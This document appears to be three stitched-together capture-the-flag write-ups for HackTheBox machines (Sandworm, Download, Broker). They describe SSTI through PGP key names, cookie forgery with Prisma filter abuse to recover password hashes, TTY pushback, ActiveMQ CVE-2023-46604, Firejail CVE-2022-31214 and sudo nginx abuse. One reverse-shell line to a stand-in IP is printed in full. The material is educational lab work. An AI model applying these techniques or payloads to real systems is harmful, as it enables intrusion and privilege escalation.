The post 80 webserver on 80 is redirecting to https://ssa.htb, which matches the subject of “SSA” and organization of “Secret Spy Agency” on the certificate. Given the use of virtual host routing, I’ll try fuzzing both 80 and 443 for any subdomains that respond with something different using ffuf, but not find anything. I’ll add ssa.htb to my /etc/hosts file.
Before looking at the site, I’ll take a more detailed look at the certificate.
The email address atlas@ssa.htb is in there. Not much else beyond what nmap showed.
Visiting the HTTPS site either by IP or by ssa.htb returns the same page. It’s the website of a spy agency:
At the page footer, it says “Powered by Flask”. The page has nothing very useful. There are two links in the menu bar, for “About” (/about) and “Contact (/contact).
The About page has more text about the agency. The Contact page has a form asking for encrypted text using PGP:
The link at the bottom goes to /guide:
This page has a link to the SSA’s public key, as well as three demos:
Enter text encrypted with the SSA’s public key and it will decrypt it.
Enter your public key and they will provided you an encrypted message to decrypt.
Enter a public key and a signed message and it will tell you if it’s valid or not. There’s an example signed message. If I give it that message as well as the SSA’s key, it reports success:
I have a pretty good idea from the page footer that this is running on Python Flask. Unfortunately, there’s no real clue in the headers or page source beyond that. The HTTP response headers just show nginx:
The 404 page is a good signal:
That’s the default Flask 404 page:
I’ll run feroxbuster against the site with no extensions given that it’s likely Python Flask:
It finds a few interesting things. There’s some kind of login ability, as /admin and /view both redirect to /login, and there’s a /logout as well.
The login page looks like a normal login form:
Some basic guesses don’t get in.
Pretty Good Privacy (PGP) is a widely-used data encryption and decryption program that provides cryptographic privacy and authentication for communication over the internet. Created by Phil Zimmermann in 1991, PGP is designed to secure electronic communication, including email, file storage, and file sharing. PGP employs a combination of symmetric-key cryptography for efficient data encryption and public-key cryptography for secure key exchange. Users generate a pair of cryptographic keys: a public key that can be shared openly and a private key kept secret.
To encryption something for a given user requires that users public key. PGP will use that public key to encrypt, and because of how the asymmetric cryptography works, only the paired private key will be able to decrypt it.
Signing is kind of the opposite. To sign a message, PGP uses a user’s private key. Then, anyone with access to the user’s public key (which can be shared freely) can verify that only that message was signed with that paired private key.
gpg is often installed in most Linux distros, and can be installed with apt install gnupg if it’s not. Running gpg --version will show the installed version as well as information including the keyring location and the supported algorithms:
For the sake of this box, I’ll generate a key pair by running gpg --gen-key, and answering the questions:
--list-keys will show this key in my keyring:
The SSA key is available at /pgp on the site. I’ll download it with wget:
The result actually has a bit of HTML still wrapped around the key, but it doesn’t make. gpg is smart enough to identify the key headers when I import it:
It shows up in the --list-keys as well:
I’ll note the email address of atlas@ssa.htb.
The first example on the site is takes an encrypted message using the SSA public key, and returns the decrypted message:
I’ll create a message:
I’ll encrypt it with gpg giving the email address from the public key:
--armor (or -a) gives the ASCII (non-binary) output. -r atlas@ssa.htb tells gpg to encrypt for that user (with their public key).
I’ll drop that block into the site, and when I click “Decrypt Message”, it goes away and the result shows up under “Decrypted Message:”:
For the next example, I need to give them my public key, and they will return an encrypted message:
To see my public key, I’ll use gpg --export:
I’ll paste that into the site, and get back a message, which I’ll save as from_ssa.msg.asc:
gpg -d will decrypt it (using the private keys available in my keyring):
This demo takes both a public key and signed text. The website actually has an example of a signed message at the bottom of the page:
I’ll copy that block into the “Signed Test” block, and the SSA public key into the “Public Key” section:
Clicking verify signature pops a message showing it is valid:
If I change on letter in the signature (for example, the last “e” to “f”):
And resubmit, the popup shows failure:
I can also sign my own message with --clearsign (--sign will output a binary format):
I’m using --output - to send the output to STDOUT rather than to a file.
Pasting this plus my public key into the website shows it is valid, and includes my name in the result:

Category: Shell as atlas in Jail
When looking at Python Flask applications, a common thing to check for is server-side template injection (SSTI). This attack is getting some text I control to be rendered by the template engine (probably Jinja2 for Flask), which effectively means it’s run as code.
To get SSTI, I typically want to look for places where some input of mine is displayed back to me. In the Encrypt demo, I give it encrypted text and the decrypted text is displayed back. I can check for SSTI in that by making a message with a bunch of SSTI payloads (pulled from the SSTI HackTricks page):
I’ll encrypt it with the SSA’s public key:
When I paste the resulting message into the demo, it returns the message, but none of the potential injections are different (if any of the “7*7” had become 49, that would have been a signal):
The decrypt demo only takes in a public key, and what comes back is an encrypted message. It’s possible there could be some kind of blind SSTI in the background, but I’ll come back to this.
The output above shows that some fingerprints of my PGP key as well as the username of the key are displayed back in the popup. The fingerprint data is all hex, and therefore not possible to carry an SSTI payload. I’ll try putting a SSTI payload in a key as my username. It doesn’t take any character, so I’ll try putting the tests that I can in:
Because I have two secret keys in my keyring, I’ll need to specify which one to sign with with --local-user:
I’ll get the new public key (gpg --export -a ssti@ssa.htb) and put them both into the demo form. There are several “49” strings in the popup!
It looks like any time I had {{ }} it is handled as code, which suggests the Flask default template engine, Jinja2.
To test for code execution, I’ll grab a payload from further down on the HackTricks SSTI page:
The steps here are not too complex:
gpg --gen-key to make a new key, with that payload as the username, and the email being something new I can remember (so like rce-id@ssa.htb for this one that runs id).
Sign any message with gpg --clearsign giving the new user with --localuser to get the signed message.
Dump that user’s public key with gpg --export -a:
Enter the public key and signed message into the site and submit.
The result is code execution, as the result of the idcommand is clearly there in the returned text:
To get a shell on Sandworm I’ll try to create a SSTI payload that connects back with a reverse shell. I learned earlier that gpg won’t let me have < or > in my name. Trying here fails:
I’ll encode the reverse shell in base64 (the first result would probably work, but I like to add spaces to get rid of characters like + and = and it doesn’t change the command):
I can test this on my own system by starting nc -lvnp 443 in one window, and then running:
It connects with a shell, which shows it works. I’ll add that to the SSTI payload:
Now I repeat the steps from above:
With nc listening, I’ll submit these to the site and get a shell as atlas:

Category: Shell as silentobserver
The first thing I try to do when I get a shell is upgrade it to a full PTY to get things like up arrow and delete. Typically I do that with script and stty using the trick I break down in detail in this video. Unfortunately, when I run script, it fails:
script is one method to get a pseudo terminal assigned to this session. Without script, I can try Python:
It can’t find python either. python3 does run, but with an error as well:
Still, it worked enough that the rest of the trick works:
Many commands return the same message about not being able to find the command-not-found database. For example, touch is missing:
Many common networking tools as well:
There’s not much on the filesystem of interest. /bin has only a handful of binaries:
This is way less than on a standard machine, because of the jail.  /opt is empty (I’ll see later this is because of the jail, and look at the config in Beyond Root):
I can’t run ps either. But I can access /proc:
Each numbered directory represents a process and will have a cmdline file with the command line called to start the process. These are missing newlines at the end, so it’s a bit messy, but a quick way to take a look is just to cat them all together (I’ll make this more readable in a minute):
At least for the ones I can read, firejail jumps out.
For a better look at the processes, I’ll write a quick bash oneliner loop, which I’ll show here with added whitespace:
It’s going to read all the items in the current directory (/proc), and then for each try to cat a cmdline file from that directory (cat "$d/cmdline"). If that fails, the output / error messages go to /dev/null (2>/dev/null). && means keep going only if the previous command succeeded, and in that case, it will print the pid of the file at the end. The result looks like:
This output still has nulls where spaces should be, so they appear missing. Still I can see what’s going on. All I can see is processes running as atlas (from the jail). There’s the firejail jail with the webappflaskrun profile, Flask running presumably the webapp (I can verify that by going into 20/cwd and seeing it matches /var/www/html/SSA), the gpg-agent, and then mostly just stuff I created exploiting the box.
The website lives in var/www/html/SSA/SSA:
There’s not much useful in the application, though I’ll go through it in Beyond Root just to understand it. However, in __init__.py, there’s a database connection string used by the Python ORM SQLAlchemy:
I don’t have a good way to connect to it at the moment (mysql isn’t allowed in the jail). I could tunnel a connection to it, but I’ll come back to it after I get out of the jail.
atlas’ home directory is in /home/atlas. There’s another user home directory, silentobserver:
atlas’ home directory has the standard stuff:
.cargo is interesting as it implies the use of the Rust programming language (more later). There are private keys in the .gnupg folder, but nothing I can do with them.
The .config directory has folders for both firejail and httpie:
I can’t access firejail.
httpie is a http client similar to curl made for testing APIs. In this directory, there’s a single folder, sessions, with a single directory, localhost:5000:
In that is an admin.json file:
This is a configuration file meant to help with testing, and it has both a session cookie and creds for the page:
It’s completely unnecessary as far as solving the box, but these creds do work to login to /admin on the webpage:
The cookie does not work. I’m not completely sure what kind of cookie it is, but there are three base64 blobs separated by “.”. The first (with one “=” for padding added) decodes to {"_flashes":[{" t":["message","Invalid credentials."]}]}, so it’s not even a valid cookie.
The creds from the httpie config might work for silentobserver with su, but atlas can’t run su:
They do work for SSH as silentobserver:
I can read user.txt:

Category: Shell as atlas
With the username and password from the website (above) I can now connect to the DB:
There’s one interesting database:
It has one interesting table:
With two rows:
I already know the silentobserver password. I’m not able to break the Odin password.
silentobserver is not allowed to run sudo:
Looking at SetUID binaries, there are some items in /opt that look interesting:
The debug tipnet is SetUID, but it’s owned by atlas:
My initial thought was that it doesn’t really help with privileges, but I haven’t had full access to atlas, only in the jail, so it may. The other two tipnet-related files are the same.
In /opt, there’s two directories:
crates is from the Cargo Rust package manager. tipnet is custom to this box.
In crates, there’s a single package, logger:
Interestingly, the silentobserver group owns the folder, and has write permissions to the src folder.
The tipnet directory is the source for a Rust project:
access.log has a last modified time in the last two minutes. At the end of the file, the last lines seem to update every two minutes:
This is a good sign there’s a cron or other scheduled task running every two minutes. The Cargo.toml file defines the Rust package:
Interestingly, the logger library is located in the crates directory (as observed). In the src folder is a single file, main.rs:
There’s nothing too exciting in the process list, but I’ll also run pspy to look for crons (first uploading it from my host):
Every two minutes, root goes into the tipnet directory and runs cargo run --offline as atlas:
After 10 seconds, it then runs clean_c.sh.
One thing to note about starting a program with cargo run is that it rebuilds the binary from source before running it. This is useful when developing a Rust program as it does the compile and run in one step.
To understand what to hijack, I need to understand how logger is used in tipnet. For those unfamiliar with Rust, I did 27 videos solving the 2015 Advent of Code challenges in Rust, available in a playlist here. In the introduction video for that series, I got over the basics of Rust, comparing it to Python, which might be nice background here.
Trying to run tipnet with cargo run from /opt/tipnet fails. Without --offline, it hangs, presumably trying to download the packages (crates) and HTB machines are not connected to the internet. If I give the --offline flag, it fails differently:
silentobserver can run the version in /opt/tipnet/target/debug/, which is already compiled:
Running any of b-d returns a message about this mode not being ported to Rust yet.
Running a prompts for a query and a justification, and then just returns. e just prints:
Rust is very hard to do things like a buffer overflow, and I can read the source, so no need to poke at that yet.
/opt/crates/logger/src/lib.rs file has one function, log:
It’s opening the file at /opt/tipnet/access.log and writing a line into it.
/opt/tipnet/src/main.rs has several functions, including the menu and the ASCII art observed when running it. There is a connection to a database:
I’ll note that to try to see what’s in there.
The option e is what’s being run on the cron to “Refresh Indeces”. That makes a DB query and then writes to the DB, and eventually calls the logger:
Given that the binary is compiled each time the cron is executed (because of cargo run), if I can modify any of the code, I can get execution as atlas. I noted above that the main.rs file was not writable. But the source for the logger library that’s imported is:
I’ll modify that to get execution as atlas (presumably outside of the jail, as cargo wasn’t a binary inside the jail).
The cleanup on this box is done in a rather annoying way, where it seems to delete the entire tipnet directory and rebuild it. That means if I have a shell in that directory when it happens, it gets lost. I found the best way to modify this is to have the shell in /opt, and then vim crates/logger/src/lib.rs. Then I can write my changes and get another SSH session to look for results. By leaving vim open, even when the cleanup deletes the directory and recreates it, my changes are still in my copy. When I just save again, it will warn me:
Entering y will save over the cleaned copy.
There’s a Rust struct (think object) named Command [docs]. I’ll need to add use std::process::Command at the top, and then I’ll put my Command invocation at the bottom:
I’ll wait for the next two minute cron, and then there’s a file in /tmp owned by atlas:
To get a shell, I’ll modify what runs to a bash reverse shell:
After a couple minutes, I get a shell:
And this time, the shell upgrade works without issue, which is a good signal it’s not in the jail:

Category: Shell as Root
As atlas now, this shell has an additional group, jailer:
The only file on the entire filesystem that atlas can access that has the jailer group is filejail:
The firejail version on Sandworm is 0.9.68:
The releases page on GitHub shows that’s from Feb 6, 2022:
This is helpful to know because there are a lot of older firejail exploits.
Searching for “firejail 0.9.68 exploit”, the first hit is a post on seclists.org about CVE-2022-31214. It’s a post that starts:
The following report describes a local root exploit vulnerability in
Firejail [1] version 0.9.68 (and likely various older versions). Any
source code references in this report are based on the 0.9.68 version
tag in the upstream Git repository.
That seems to match. There’s also the first item in the changelog for the following release, 0.9.70:
“Full working exploit code was also provided” is great to hear. I used this same exploit and script before on Cerberus.
Firejail has a “join” functionality, where a user outside the sandbox can run programs and interact inside the jail environment. The post describes how the join functionality runs as effective UID 0 (root).
When trying to join a target process, it checks for a file in the mounted namespace, /run/firejail/mnt/join. For the join to work, that must be a regular file, owned by root (as seen from the initial user namespace), and have a size of 1 byte, with that byte being the ASCII character “1”.
The issue here is that a user can create a symlink at /run/firejail/mnt/join that points to a file that fulfils the requirements, effectively faking a Firejail process. This allows the attacker to get significant access from within their controller environment.
I’ll need two shells to run this exploit, so I’ll go for an SSH connection. In ~/.ssh, I’ll create an authorized_keys file with my public key, and make sure the permissions are right:
Now I can connect:
I’ll get two sessions up.
I’ll download the Python POC script and upload it to Sandworm. If I try to run it without making it executable, it complains:
On fixing that, it works, starting the fake environment where the user can su - without a password:
In the other shell, I’ll join the jail, and then run su -:
I can read root.txt:
In this video, I’ll dig into the Flask application on Sandworm, see how it starts, how it provides the GPG services, and where the vulnerability is. Then I’ll build a small Flask app of my own and show how the SSTI works.
In /home/atlas/.config/firejail there’s a file webapp.profile. (There is also a backup copy in /root that is used by the cleanup script to restore this in case HackTheBox players mess with it). This is what shows up in the Firejail command line, /usr/local/bin/firejail --profile=webapp flask run. It’s saying run flask run inside the jail with that profile.
The profile has the following:
The interesting parts are where it sets a private tmp, opt, dev, and bin. The first three are basically empty. bin gets mapped a handful of binaries (the ones I was able to run from within the jail). It also configures the website directory so that submissions can be written to but not executed from.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 05 Aug 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
The website is returning a redirect to http://download.htb. Given the use of virtual host routing, I’ll use ffuf to fuzz for subdomains that return something different from the main domain, but not find anything. I’ll add download.htb to my /etc/hosts file.
The site is for a file sharing service:
There are links at the top for “Upload” (/files/upload) and Login (/auth/login), and the link at the bottom points to /files/upload as well.
The upload link gives a form to upload a file:
If I give it a file, it returns a page at /files/view/[guid] with “Download” and “Copy Link” buttons:
“Copy Link” just puts the current URL on the page. Download (/files/download/[guid]) returns the file.
The “Login” link gives a login form:
The “Register Here” link (/auth/register) loads a page that offers the chance to track and delete uploaded file and a form:
I’ll create an account (must be at least 6 characters), and it sends me back to the login page. If I try to register the same account again, it returns an error:
I could potentially brute force usernames here. Some quick manual guesses don’t find anything.
On logging in, there’s a home page (/home) that shows my uploaded files:
On the upload page, there’s now an option for “Mark file as private”:
On viewing a file, I now have the option to delete it (both on the view page for the file, and on the home page):
Private files show up marked that way:
The HTTP response headers show that the site is running ExpressJS:
It also sets two cookies on first visiting /. download_session is base64 and decodes to:
The application is passing messages for “flashing” on the page via the cookie, so the same user will have many different cookies.
download_session.sig also looks like base64, but it doesn’t decode cleanly. If I add a base64 padding byte to it, it does decode:
The result is not ASCII, but 20 bytes, which is the length of SHA1. It is likely a signature to prevent tampering with the cookie.
Once I’m logged in, and download_session cookie gets longer, adding user information:
The signature is still 27 bytes.
If I try to modify the cookie (say, change “0xdf0xdf” to “admin”) without changing the .sig, the response just redirects to the login page (because the cookie isn’t valid).
The 404 page on the site is custom to the site:
I’ll run feroxbuster against the site with no extensions since the server is JavaScript. When I start, I’ll notice quickly that both Static and static return the same results. I’ll kill the run and restart with a lowercase word list to speed it up a bit:
I’ll try brute forcing http://download.htb/files/ and http://download.htb/auth/, but it doesn’t find anything besides what I know about already. The webserver even returns 404 not found for /files/view/ (with no idea), so it seems like I’ll need the full API path to get a result.

Category: Shell as wesley
Looking at Burp to see what requests have been happening while interacting with the website, there’s two endpoints involving files:
Both of these seem like they might interact with a database, so I’ll try adding a simple ' at the end of the ID for each. The view page redirects to /files/upload with a message that say something went wrong:
This is not really suspicious, as the same thing happens if just a character in the file id is changed. It could be handling the input correctly and just not finding a file.
The download button just happens in the background, so I’ll move to Burp Repeater. Adding a ' to the end returns a 404 not found, but different from the 404 page from what I noted above:
One interpretation of the different 404s is that /files/download is trying to read files directly from the file system through NGINX, bypassing the Express application entirely (that turns out not to be what’s happening here, but it sent me down this path).
I’ll immediately try to read /etc/passwd, but it doesn’t work:
Another check with the file system is to include extra /, as a Linux file system will not mind extra slashes. Adding one before the file ID leads to the Express 404:
However, if I URL-encode / to %2f, then it loads the file!
The fact that an extra / didn’t break the request is a good sign the site could be loading files from the filesystem.
Even with URL-encoded slash, I still can’t read /etc/passwd.
There’s a couple ways to prove that there’s a file read vulnerability in this site. The first is to guess at the name of the directory that holds the uploaded files. After trying files, upload, uploads works:
I could also think about the kinds of files I would expect in the next directory up. This is a Node application, so it’s fair to think there’s a package.json, as well as a main file that’s something like app.js or main.js or server.js. package.json works (and shows the name of the main file is app.js):
The package.json file is a standard file in a Node project that describes an application, how to interact with it, and what it’s dependencies are. In this case, it starts by showing the main function is in app.js, as well as defining scripts for tests (nothing but an echo), dev (running ./src/app.ts), and build (calling tsc, which is a TypeScript comilier):
Next it gives an author:
I’ll want to keep this in mind as a potential username (though it’s not registered on the website already).
Finally, it gives the packages that are used (including some used only for development):
Prisma is an ORM for interacting with a database, cookie-parser is ExpressJS middleware for getting cookies, cookie-session is what is adding the .sig cookie (source here).
app.js starts by importing the necessary libraries:
Then it configures these, including cookie-session:
That key is likely what I need to sign cookies.
Next it defines routes:
It is loading more files that container additional routes. files_1.default is defined at the top as ./routers/files (which has an implied .js)
At the bottom of the file is another odd bit:
This is doing some kind of listener on localhost that’s running raw SQL queries to keep stats about file usage. I’ll need this later.
The home page is very simple, just giving a list of files for the logged in user. The routes in routers/home.js show just that:
It’s mostly just a big Prisma query based on req.session.user as the filter.
There is clearly some kind of cookie signing going on, and I have access to a key. I want to understand how it is doing that signing so I can try to forge cookies.
The cookie object is initialized using this line:
cookie_session_1 is defined at the top:
I can search for “cookie-session” in the npm index and find the package:
This points to the GitHub repo for the project.
The entire thing lives in index.js. On lines 61-63, the cookies are passed into a new Cookies object:
Cookies is defined on line 17:
This package exists in NPM as well:
And is on GitHub here.
The cookies package README talks about the .sig cookies, which is a good sign this is the correct package:
Unobtrusive: Signed cookies are stored the same way as unsigned cookies, instead of in an obfuscated signing format. An additional signature cookie is stored for each signed cookie, using a standard naming convention (cookie-name.sig). This allows other libraries to access the original cookies without having to know the signing mechanism.
I came prepared to go into the source, but the README also talks about the signature:
Create a new cookie jar for a given request and response pair. The request argument is a Node.js HTTP incoming request object and the response argument is a Node.js HTTP server response object.
A Keygrip object or an array of keys can optionally be passed as options.keys to enable cryptographic signing based on SHA1 HMAC, using rotated credentials.
It is using SHA1 HMAC. I could have guessed that with the analysis above, but sometimes it won’t be that easy.
That’s enough information to start playing with some cookies the site provided and see if I can recreate the signature. The empty cookies before looking in looks like:
Cyberchef is a nice place to play with this because I can use the various functions to easily try different things. There’s a HMAC recipe that allows me to select SHA1 and give a key. It’s not clear wha the format of the key should be:
It’s all digits. It could be hex or even Base64, but with no letters, both seem unlikely. Decimal seems like a weird way to do it. I’ll notice that for this key, UTF-8 and Latin1 make the same output. I’ll try UTF-8 for now (knowing I could come back and change it later).
The result is a 40 character hex hash:
The signature cookie is 27 characters that look like base64. If I base64-encode these 40 characters, the result is 56 characters. However, if I convert the hex to bytes first, the result is 28:
And, the cookie didn’t have a the “=” padding on the end, so if I drop that, I’ve got a probable match.
Unfortunately, that doesn’t match my signature cookie, 4kbZR1kOcZNccDLxiSi7Eblym1E. I’ll try playing with the key format, but no luck.
Another thing to consider is what is being signed. I put the cookie value in. But what if the name is included as well? That works!
I can verify with some other logged in cookies, and they work as well.
Above I noted that home.js is using the user object from the cookie as the criteria for querying what rows come back.
So with this cookie:
It is querying for files associated with a user that has user id 16 and the username “0xdf0xdf”.
ORMs use models to give the programmer a more intuitive way to access objects in the database. In this case, the developer assumed that an attacker wouldn’t be able to modify the user in the cookie, and therefore, just trusts the cookie to query appropriately.
What happens if I send in the cookie so that the user is empty:
My hope is that it will return all the files for all the user, as there’s no filter.
That base64 encodes to eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6e319 which has a signature of RdmrvnrBpzrS3slS77uG7Cuiv-Q. When I add this to Firefox and reload /home, it works:
There are tons of files from different users on the page.
To get a better feel, I’ll go into Burp, find this request, right click, and select “Copy as curl”, and then move to a terminal. I can remove a bunch of stuff (and make sure to remove the accept gzip so that the data comes back as ASCII) and end up with something like this to count:
There are 27 files from 16 unique users.
I’ll spend some time reading each of the files, but nothing interesting comes from it.
Presumable the user object in the database has a field storing the password (likely a password hash). If I put in a query with a bad column name, the application crashes and a 502 comes back. For example, if I try {"user":{"hash":{}}}, that makes a cookie of eyJ1c2VyIjp7Imhhc2giOnt9fX0= and a sig of o8bjoAGTBkr0Gwr62EwKyGD4wC4. When I send that, it crashes:
However, if I change it to {"user":{"password":{}}}, it returns all the documents:
That means the correct column name is password, and its showing all the documents with a user that has any password!
The Prisma documentation shows examples that use things like {"password": {startsWith: "a"}}. If that works here, I can use that to brute force the password character by character. I found for it to work, I had to put startsWith in double quotes, but it does work. For example, {"user":{"password":{"startsWith": "1"}}} returns documents from both Tabific and AyufmApogee:
With this together, I can brute force passwords for users with this script:
The make_cookies function will generate the cookie and signature, returning a dictionary with the cookie names and values. In the main program, I’ll start with an empty password, and loop over each possible hex character (I’m assuming this is a hash) and if it gets back a page without “No files found”, then I know that’s the next character in the password. It appends that character to the password, and starts the loop again. Only if it tries all the characters and finds no match does it exit.
It takes about a minute to run:

I can use the same script to get hashes for the other users as well, but I’m most interested in wesley as they are also the author of the package, and therefore most likely to have an account on Download.
I’ll save that hash to a file and pass it to hashcat. The detect mode comes up with a bunch of formats that it could be:
I’ll try with basic MD5 (-m 0) and it cracks instantly:
That password works as wesley on Download over SSH:
And I get user.txt:

Category: Shell as root
There’s nothing else of interest in wesley’s home directory:
There are no other user home directories in /home, and /opt and /srv are empty as well.
/var/www has two folders, html and app. html just has the default nginx page. app has the download app that I exploited already:
The app is very much like I figured out using the file read vulnerability. Interestingly, no where in this directory does it configure how it connects to a database.
netstat shows a service on 5432, which is the default port for PostGreSQL:
The connection string is actually in an environment variable set when NodeJS starts as a service:
The password “CoconutPineappleWatermelon” works to connect:
There are four databases:
The current database (download) has three tables:
For some very weird reason I can’t explain, to interact with a table I must put it in double quotes:
There’s not anything new here either.
Looking at the running processes, on constantly running process is a Python script, management.py:
There is a management.service in /etc/systemd/system, but it’s only readable by root:
I’ll upload pspy to look for any recurring running jobs. Every so often, there’s an interesting series of processes. It starts with a connection of SSH from root:
Then there’s a ton of stuff related to root’s getting a shell, running message of the day banners, etc. Then, still in the same second, it runs ./manage-db (twice for some reason?):
It calls systemctl a couple times to check the status of services:
Then it calls su -l postgres to drop to the postgres user (UID 113), and, after initializing bash, does some DB stuff:
The man page for su shows -l (same as - and --login) will:
There’s an issue known as “TTY pushbash” that has been raised as a security issue since 1985. There are tons of posts about it over the decades as it raises and is forgotten, though it seems to be being fixed in some distros now (for example).
When a privileged process runs su, unless it gets -P/--pty, the new process lives within the same pseudo-terminal (PTY) as the old one. There is a IOCTL target, TIOCSTI, that allows for pushing bytes into the TTY’s (or PTY’s) input queue.
That means if an attacker can run commands from the lower privileged user when the high privileged user drops to that user, they can run commands as the high privileged user. How could that happen? If the attacker can write to a script that runs when the login happens (such as .profile), and the privileged user runs su - (or su -l), then these will be executed as the privileged user.
This article is the most recent post that shows how to execute the attack.
The POC in the blog post is a Python script:
It stops the current process (the low priv shell), returning focus to the parent (the root shell). Then it send characters via the ioctl one by one so that they type into the shell the command and then a newline. 0 is the file descriptor for STDIN, and TIOCSTI is the ioctl that allows this write.
.bashrc, .profile, and .bash_login all seem like potential files to poison. For some reason, I was able to get this to work with the latter two, but not with .bashrc. It’s also important to note that the way the bot runs is to delete all the files in the postgres user’s home directory (presumably to prevent players spoiling for each other), wait 60 seconds, run the code to trigger the exploit, wait 30 seconds, and start again. This means that if I write into postgres’ home directory during that latter 30 seconds, the file will be deleted before the exploit can be triggered.
I’ll create an exploit script at /dev/shm/poc.py:
This is like the POC, except my command is just to make a copy of bash as /tmp/0xdf and make it SetUID / setGID to run as root.
I need a way to write to the .bashrc file in the postgres user’s home directory. The home directory is /var/lib/postgresql. I can’t write there directly as wesley:
I’ll have to write from the database. I’ll connect with the password “CoconutPineappleWatermelon”:
I’ll use the COPY command to write to the .bashrc:
It works:
The next time the bot cycles and tries to run, it calls manage-db as root, and then drops to UID 113 (postgres). But then it doesn’t call psql, rather just doing some bash calls and then returning to root:
/tmp/0xdf is there with the SetUID/SetGID bits on (s instead of x for owner and group):
It provides a shell with root effective IDs and I can read the flag:
As root, I can look at the automations that allow for the TTY Pushback attack. management.py is set to run as a service:
It does some cleanup in the postgresql user’s home directory, and then sleeps for a minute. Then it SSHes into the box as root, runs manage-db, and then connects to Postgres (as the postgres user). Then it sleeps 30 seconds and kills the connection.
To show how the TTY Pushback attack works, I’ll do some demos. With a root shell, I can get the root password from the management.py script, and SSH in as root in two different terminals. In the first, I’ll add a long sleep to the end of the wesley user’s .bashrc file:
In the first shell, I’ll run su - wesley. This is what the script does (- is the same as -l), and what I typically do when changing users on a Linux machine:
It hangs, as .bashrc is executed, and it therefore sleeps for 1000 seconds.
While this is running, I’ll examine the processes in the other shell.
The SSHD process starts bash as root. When I run su - wesley, that runs as root, but starts another bash process (19323) as wesley. The important part to notice here is that all of these processes are running in pts/0.
I’ll kill that sleep and exit back to the shell as root. I’ll do the same thing, but this time run su -P wesley. The processes look similar:
The only difference is that when the new bash process (20015) starts as wesley, it starts in a new pseudo-terminal (PTY, or pts). This means that the TIOCSTI ioctl can’t communicate back to the bash as root (19045).
The file read vulnerability isn’t what I expected. There are no rules for static files in nginx, but rather it’s handled by the app with this code in /var/www/app/routers/files.js:
client is the Prisma ORM, and it’s making a query to the Files table based on the ID pulled from the URL. The resulting query is stored in fileEntry.
The bug here is the next check. It is using ?. as the Optional Chaining operator. This is a way to query into an object where the object might not exist. The author likely intended to have it check for private or different author or not exist, and return 404 for any of those. The problem is, if fileEntry does not exist, then fileEntry?.private returns False, and it does not 404.
Express routes take a request (req) and response (res) object. Once past the 404, it uses the path library to join the uploads directory with the passed in file id, and returns the raw version of that (with res.download).
Because fileEntry?.name is False, it returns “Unknown” as the filename:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 09 Nov 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.097s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
39751/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknownCategory: Recon
nmap finds nine open TCP ports:
My initial assessment of the ports is:
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
Visiting the site just asks for HTTP basic auth:
Trying “admin” / “admin” works. It’s an admin interface for ActiveMQ:
The “Manage ActiveMQ broker” link leads to /admin/:
This gives the broker ID, uptime, version, etc.
ActiveMQ is a very popular open-source message broker. Message brokers are designed to manage communications between different systems (often written in different languages). For example, if a transaction is requested through a bank’s webserver, it may need to contact a different backend server to process that transaction. If the webserver does that on it’s own, there’s a lot of risk for things like outages and missed communications. Instead it might use a message broker that will handle taking the request and making sure it reaches the other server.

Category: Shell as activemq
This box has been released on HackTheBox directly to retired as a chance to show off a newsworthy vulnerability, CVE-2023-46604 in ActiveMQ. Searching for “ActiveMQ vulnerability” will turn up all sorts of articles about ransomware crews using this attack to own ActiveMQ servers:
The vulnerability is very easy to exploit and unauthenticated, getting the very rare top CVSS score of 10.0. ActiveMQ has a bunch of different versions, but in the 5.15 group, anything before 5.15.16 is vulnerable (including Broker’s 5.15.15).
evkl1d has a Python POC on GitHub that’s useful for both understanding the vulnerability and exploiting it.
The Python code takes a target IP, port (default 61616), and “Spring XML Url”. It builds a payload which looks like a serialized object, as it starts with a header, then a series of objects that start with their length and then their value. It converts to hex, and send this as a message to ActiveMQ port.
The payload is exploiting a deserialization vulnerability in ActiveMQ, and using a gadget from the Spring to load a remote XML file, which has the ability to run programs.
For a much more detailed look at the exploit, this medium post does a nice job, and pulls from original research from X1r0z (here in Chinese).
To run the POC, I can start with a Python webserver and run the Python script:
There is a hit at my websertver (twice actually):
So I need to look at this XML file. The exploit comes with poc.xml:
It’s clearly calling a classic bash reverse shell, bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001'. I’ll update the payload to my IP address and host it with the Python webserver.
With nc listening on 9001, I’ll run the exploit again. It fetches poc.xml (twice):
And then a shell at nc:
I’ll do a shell upgrade:
And grab user.txt:

Category: Shell as root
The activemq user can run nginx as root with no password:
With sudo nginx, I solved this by standing up my own server as root. This page has example configs. Mine is quite simple. user will be root. It must have an events section to define the number of workers, so I’ll pick something arbitrary. Then I make an http section with a server that is hosted from the system root:
I’ll start the webserver by running nginx with -c and the full path to this file.
Then I can query this webserver on 1337 and read files as root:
This is enough to get the flag and solve the box:
nginx can also handle PUT requests which write files. I’ll update the config to include enabling PUTs:
I’ll also need to change the port. I don’t have a way to kill the running server on 1337, and if I try to run with the same port, nginx will fail to listen and abort.
Now I run this:
And a new server is listening on 1338, returning a file listing for /:
If I use a PUT request instead, it’ll write what I send to the file:
So this writes my public SSH key to root’s authorized_keys file.
Now I can SSH as root to Broker:
The author of this box modeled this part of the box after a a Zimbra vulnerability, CVE-2022-41347. The issue is that this version of Zimbra left the zimbra user with the ability to run sudo nginx. The researcher who identified this vulnerability walks through it all in this post. They show file read the same way I did, but to get a shell, they took a different path, which is interesting.
They create a nginx webserver running as root with the error log configured to overwrite the ld.so.preload file. From the ld man page:
/etc/ld.so.preload
File containing a whitespace-separated list of ELF shared libraries to be loaded before the program.
So if I can then trigger an error message that includes the full path of a malicious library to include, that will be written into the file. Then any program executed will try to load that library (and a bunch of things that aren’t libraries, but that’s ok).
